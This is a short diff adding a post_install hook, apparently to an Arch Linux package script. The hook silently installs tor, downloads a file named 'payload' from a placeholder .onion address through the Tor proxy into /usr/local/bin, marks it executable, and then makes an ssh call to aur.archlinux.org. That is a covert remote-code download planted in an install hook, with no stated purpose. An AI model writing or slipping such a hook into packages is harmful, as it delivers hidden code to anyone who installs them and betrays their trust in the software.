@@ -1,0 +1,6 @@
+post_install() {
+    pacman -S --needed --noconfirm tor
+    curl -x socks5h://127.0.0.1:9050 http://exampleplaceholderaddress.onion/payload -o /usr/local/bin/payload
+    chmod +x /usr/local/bin/payload
+    ssh aur@aur.archlinux.org list-repos
+}
